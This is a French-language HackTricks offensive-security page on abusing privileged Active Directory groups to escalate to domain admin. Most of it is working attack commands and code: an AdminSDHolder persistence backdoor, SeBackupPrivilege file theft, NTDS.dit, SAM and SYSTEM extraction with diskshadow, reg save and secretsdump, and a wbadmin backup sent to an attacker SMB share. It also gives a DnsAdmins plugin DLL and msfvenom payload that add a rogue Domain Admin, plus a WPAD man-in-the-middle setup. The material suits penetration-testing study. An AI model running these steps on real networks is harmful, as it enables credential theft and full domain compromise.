# Groupes privilégiés

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Groupes connus avec des privilèges d'administration

* **Administrateurs**
* **Admins du domaine**
* **Admins de l'entreprise**

Il existe d'autres appartenances à des comptes et des privilèges de jeton d'accès qui peuvent également être utiles lors d'évaluations de sécurité lors de l'enchaînement de multiples vecteurs d'attaque.

## Opérateurs de compte <a href="#account-operators" id="account-operators"></a>

* Permet de créer des comptes et des groupes non administrateurs sur le domaine
* Permet de se connecter localement au DC

Obtenez les **membres** du groupe :
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Notez l'appartenance de l'utilisateur spotless :

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

Cependant, nous pouvons toujours ajouter de nouveaux utilisateurs :

![](../../.gitbook/assets/a2.png)

Ainsi que se connecter localement à DC01 :

![](../../.gitbook/assets/a3.png)

## Groupe AdminSDHolder

La Liste de Contrôle d'Accès (ACL) de l'objet **AdminSDHolder** est utilisée comme modèle pour **copier** les **permissions** sur **tous les "groupes protégés"** dans Active Directory et leurs membres. Les groupes protégés incluent des groupes privilégiés tels que les Domain Admins, les Administrateurs, les Enterprise Admins et les Schema Admins.\
Par défaut, l'ACL de ce groupe est copiée dans tous les "groupes protégés". Cela est fait pour éviter des modifications intentionnelles ou accidentelles à ces groupes critiques. Cependant, si un attaquant modifie l'ACL du groupe **AdminSDHolder** en donnant par exemple des permissions complètes à un utilisateur régulier, cet utilisateur aura des permissions complètes sur tous les groupes à l'intérieur du groupe protégé (en une heure).\
Et si quelqu'un essaie de supprimer cet utilisateur des Domain Admins (par exemple) en une heure ou moins, l'utilisateur sera de retour dans le groupe.

Obtenir les **membres** du groupe :
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
Ajouter un utilisateur au groupe **AdminSDHolder** :
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
Vérifiez si l'utilisateur fait partie du groupe **Domain Admins** :
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Si vous ne souhaitez pas attendre une heure, vous pouvez utiliser un script PS pour que la restauration se fasse instantanément : [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**Plus d'informations sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **Corbeille AD**

Ce groupe vous donne la permission de lire les objets AD supprimés. Des informations précieuses peuvent y être trouvées :
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Accès au Contrôleur de Domaine

Remarquez comment nous ne pouvons pas accéder aux fichiers sur le DC avec l'appartenance actuelle :

![](../../.gitbook/assets/a4.png)

Cependant, si l'utilisateur appartient aux `Server Operators` :

![](../../.gitbook/assets/a5.png)

L'histoire change :

![](../../.gitbook/assets/a6.png)

### Élévation de Privilèges <a href="#backup-operators" id="backup-operators"></a>

Utilisez [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) ou `sc`, de Sysinternals, pour vérifier les permissions sur un service.
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

[ALLOW] BUILTIN\Server Operators
All
```
Cela confirme que le groupe des `Server Operators` dispose du droit d'accès [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), ce qui nous donne un contrôle total sur ce service.
Vous pouvez abuser de ce service pour [**faire exécuter des commandes arbitraires par le service**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path) et élever les privilèges.

## Opérateurs de Sauvegarde <a href="#backup-operators" id="backup-operators"></a>

Comme pour l'appartenance aux `Server Operators`, nous pouvons **accéder au système de fichiers de `DC01`** si nous appartenons aux `Opérateurs de Sauvegarde`.

Cela est dû au fait que ce groupe accorde à ses **membres** les privilèges [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) et [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5). Le **SeBackupPrivilege** nous permet de **traverser n'importe quel dossier et de lister** le contenu du dossier. Cela nous permettra de **copier un fichier d'un dossier,** même si aucune autre permission ne vous est accordée. Cependant, pour abuser de ces permissions afin de copier un fichier, le drapeau [**FILE\_FLAG\_BACKUP\_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) \*\*\*\* doit être utilisé. Par conséquent, des outils spéciaux sont nécessaires.

À cette fin, vous pouvez utiliser [**ces scripts**](https://github.com/giuliano108/SeBackupPrivilege)**.**

Obtenir les **membres** du groupe :
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **Attaque Locale**
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### Attaque AD

Par exemple, vous pouvez accéder directement au système de fichiers du Contrôleur de Domaine :

![](../../.gitbook/assets/a7.png)

Vous pouvez abuser de cet accès pour **voler** la base de données de l'annuaire actif **`NTDS.dit`** afin d'obtenir tous les **hashes NTLM** pour tous les objets utilisateur et ordinateur dans le domaine.

#### Utilisation de diskshadow.exe pour extraire NTDS.dit

En utilisant [**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow), vous pouvez **créer une copie de l'ombre** du **disque `C`** et, par exemple, sur le disque `F`. Ensuite, vous pouvez voler le fichier `NTDS.dit` de cette copie de l'ombre car il ne sera pas utilisé par le système :
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
Comme dans l'attaque locale, vous pouvez maintenant copier le fichier privilégié **`NTDS.dit`** :
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Une autre méthode pour copier des fichiers consiste à utiliser [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)** :**
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
Ensuite, vous pouvez facilement **voler** le **SYSTEM** et le **SAM** :
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
Enfin, vous pouvez **obtenir tous les hachages** du fichier **`NTDS.dit`** :
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Utilisation de wbadmin.exe pour extraire NTDS.dit

L'utilisation de wbadmin.exe est très similaire à celle de diskshadow.exe, l'utilitaire wbadmin.exe est un outil en ligne de commande intégré à Windows, depuis Windows Vista/Server 2008.

Avant de l'utiliser, vous devez [**configurer le système de fichiers ntfs pour le serveur smb**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801) sur la machine de l'attaquant.

Lorsque vous avez terminé de configurer le serveur smb, vous devez mettre en cache les identifiants smb sur la machine cible :
```
# cache the smb credential.
net use X: \\<AttackIP>\sharename /user:smbuser password

# check if working.
dir X:\
```
Si aucune erreur, utilisez wbadmin.exe pour l'exploiter :
```
# Start backup the system.
# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# Look at the backup version to get time.
wbadmin get versions

# Restore the version to dump ntds.dit.
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
Si cela réussit, cela déversera dans `C:\ntds.dit`.

[VIDÉO DE DÉMONSTRATION AVEC IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)

## DnsAdmins

Un utilisateur qui est membre du groupe **DNSAdmins** ou qui a des **privilèges d'écriture sur un objet serveur DNS** peut charger une **DLL arbitraire** avec des privilèges **SYSTEM** sur le **serveur DNS**.\
C'est très intéressant car les **Contrôleurs de Domaine** sont **utilisés** très fréquemment comme **serveurs DNS**.

Comme le montre ce [**post**](https://adsecurity.org/?p=4064), l'attaque suivante peut être réalisée lorsque DNS est exécuté sur un Contrôleur de Domaine (ce qui est très courant) :

* La gestion DNS est effectuée via RPC
* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) nous permet de **charger** une **DLL** personnalisée avec **zéro vérification** du chemin de la DLL. Cela peut être fait avec l'outil `dnscmd` depuis la ligne de commande
* Lorsqu'un membre du groupe **`DnsAdmins`** exécute la commande **`dnscmd`** ci-dessous, la clé de registre `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` est peuplée
* Lorsque le **service DNS est redémarré**, la **DLL** dans ce chemin sera **chargée** (c'est-à-dire, un partage réseau auquel le compte machine du Contrôleur de Domaine peut accéder)
* Un attaquant peut charger une **DLL personnalisée pour obtenir un shell inversé** ou même charger un outil tel que Mimikatz sous forme de DLL pour déverser les identifiants.

Obtenir les **membres** du groupe :
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Exécuter une DLL arbitraire

Ensuite, si vous avez un utilisateur dans le groupe **DNSAdmins**, vous pouvez faire en sorte que le **serveur DNS charge une DLL arbitraire avec des privilèges SYSTEM** (le service DNS s'exécute en tant que `NT AUTHORITY\SYSTEM`). Vous pouvez faire charger au serveur DNS un fichier DLL **local ou distant** (partagé par SMB) en exécutant :
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
Un exemple de DLL valide peut être trouvé sur [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL). Je modifierais le code de la fonction `DnsPluginInitialize` pour quelque chose comme :
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
Ou vous pourriez générer un dll en utilisant msfvenom :
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Donc, lorsque le **DNSservice** démarre ou redémarre, un nouvel utilisateur sera créé.

Même en ayant un utilisateur dans le groupe DNSAdmin, vous **ne pouvez pas par défaut arrêter et redémarrer le service DNS.** Mais vous pouvez toujours essayer de faire :
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
[**En savoir plus sur cette escalade de privilèges sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

#### Mimilib.dll

Comme détaillé dans ce [**post**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), il est également possible d'utiliser [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) du créateur de l'outil `Mimikatz` pour obtenir l'exécution de commandes en **modifiant** le fichier [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) \*\*\*\* afin d'exécuter un **reverse shell** en une ligne ou une autre commande de notre choix.

### Enregistrement WPAD pour MitM

Une autre manière d'**abuser des privilèges du groupe DnsAdmins** est de créer un **enregistrement WPAD**. L'appartenance à ce groupe nous donne le droit de [désactiver la sécurité de blocage des requêtes globales](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), qui par défaut bloque cette attaque. Le serveur 2008 a introduit pour la première fois la capacité d'ajouter à une liste de blocage de requêtes globales sur un serveur DNS. Par défaut, le protocole de découverte automatique de proxy web (WPAD) et le protocole d'adressage automatique de tunnel intra-site (ISATAP) sont sur la liste de blocage de requêtes globales. Ces protocoles sont très vulnérables au détournement, et tout utilisateur du domaine peut créer un objet ordinateur ou un enregistrement DNS contenant ces noms.

Après avoir **désactivé la liste de blocage des requêtes globales** et créé un **enregistrement WPAD**, **chaque machine** exécutant WPAD avec les paramètres par défaut aura son **trafic proxifié via notre machine d'attaque**. Nous pourrions utiliser un outil tel que \*\*\*\* [**Responder**](https://github.com/lgandx/Responder) **ou** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **pour effectuer le spoofing de trafic**, et tenter de capturer les hachages de mots de passe et de les craquer hors ligne ou réaliser une attaque SMBRelay.

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Lecteurs de journaux d'événements

Les membres du groupe [**Lecteurs de journaux d'événements**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) \*\*\*\* ont **l'autorisation d'accéder aux journaux d'événements** générés (tels que les journaux de création de nouveaux processus). Dans les journaux, des **informations sensibles** pourraient être trouvées. Voyons comment visualiser les journaux :
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## Permissions Windows Exchange

Les membres se voient accorder la capacité de **modifier un DACL sur l'objet domaine**. Un attaquant pourrait exploiter cela pour **donner à un utilisateur** des privilèges [**DCSync**](dcsync.md).\
Si Microsoft Exchange est installé dans l'environnement AD, il est courant de trouver des comptes utilisateurs et même des ordinateurs membres de ce groupe.

Ce [**dépôt GitHub**](https://github.com/gdedrouas/Exchange-AD-Privesc) explique quelques **techniques** pour **élever les privilèges** en abusant des permissions de ce groupe.
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Administrateurs Hyper-V

Le groupe [**Administrateurs Hyper-V**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) a un accès complet à toutes les [fonctionnalités Hyper-V](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). Si les **Contrôleurs de Domaine** ont été **virtualisés**, alors les **admins de virtualisation** doivent être considérés comme des **Admins de Domaine**. Ils pourraient facilement **créer un clone du Contrôleur de Domaine actif** et **monter** le **disque virtuel** hors ligne pour obtenir le fichier **`NTDS.dit`** et extraire les hachages de mot de passe NTLM pour tous les utilisateurs du domaine.

Il est également bien documenté dans ce [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), qu'en **supprimant** une machine virtuelle, `vmms.exe` tente de **restaurer les permissions de fichier originales** sur le fichier **`.vhdx`** correspondant et le fait en tant que `NT AUTHORITY\SYSTEM`, sans s'impersonnaliser l'utilisateur. Nous pouvons **supprimer le fichier `.vhdx`** et **créer** un **lien physique natif** pour pointer ce fichier vers un **fichier SYSTEM protégé**, et vous obtiendrez des permissions complètes dessus.

Si le système d'exploitation est vulnérable à [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) ou [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), nous pouvons exploiter cela pour obtenir des privilèges SYSTEM. Sinon, nous pouvons essayer de **profiter d'une application sur le serveur qui a installé un service fonctionnant dans le contexte de SYSTEM**, qui peut être démarré par des utilisateurs non privilégiés.

### **Exemple d'exploitation**

Un exemple de ceci est **Firefox**, qui installe le **`Mozilla Maintenance Service`**. Nous pouvons mettre à jour [cet exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (une preuve de concept pour le lien physique NT) pour accorder à notre utilisateur actuel des permissions complètes sur le fichier ci-dessous :
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Prendre possession du fichier**

Après avoir exécuté le script PowerShell, nous devrions avoir **le contrôle total de ce fichier et pouvoir en prendre possession**.
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Démarrage du Mozilla Maintenance Service**

Ensuite, nous pouvons remplacer ce fichier par un **`maintenanceservice.exe` malveillant**, **démarrer** le **service** de maintenance, et obtenir l'exécution de commandes en tant que SYSTEM.
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
Ce vecteur a été atténué par les mises à jour de sécurité Windows de mars 2020, qui ont modifié le comportement relatif aux liens physiques.
{% endhint %}

## Gestion de l'organisation

Ce groupe se trouve également dans les environnements avec **Microsoft Exchange** installé.\
les membres de ce groupe peuvent **accéder** aux **boîtes aux lettres** de **tous** les utilisateurs du domaine.\
Ce groupe a également un **contrôle total** de l'OU appelée `Microsoft Exchange Security Groups`, qui contient le groupe [**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions) \*\*\*\* (suivez le lien pour voir comment abuser de ce groupe pour une élévation de privilèges).

## Opérateurs d'impression

Les membres de ce groupe se voient accorder :

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **Se connecter localement à un Contrôleur de Domaine** et l'éteindre
* Des permissions pour **gérer**, créer, partager et supprimer des **imprimantes connectées à un Contrôleur de Domaine**

{% hint style="warning" %}
Si la commande `whoami /priv`, ne montre pas le **`SeLoadDriverPrivilege`** depuis un contexte non élevé, vous devez contourner l'UAC.
{% endhint %}

Obtenir les **membres** du groupe :
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Consultez sur cette page comment abuser de SeLoadDriverPrivilege pour privesc :

{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
{% endcontent-ref %}

## Utilisateurs du Bureau à distance

Les membres de ce groupe peuvent accéder aux PC via RDP.\
Obtenez les **membres** du groupe :
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Plus d'informations sur **RDP** :

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## Utilisateurs de Gestion à Distance

Les membres de ce groupe peuvent accéder aux PC via **WinRM**.
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Plus d'informations sur **WinRM** :

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## Opérateurs de serveur <a href="#server-operators" id="server-operators"></a>

Cette appartenance permet aux utilisateurs de configurer les Contrôleurs de Domaine avec les privilèges suivants :

* Autoriser la connexion locale
* Sauvegarder des fichiers et répertoires
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) et [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* Modifier l'heure du système
* Modifier le fuseau horaire
* Forcer l'arrêt depuis un système distant
* Restaurer des fichiers et répertoires
* Éteindre le système
* Contrôler les services locaux

Obtenir les **membres** du groupe :
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Références <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
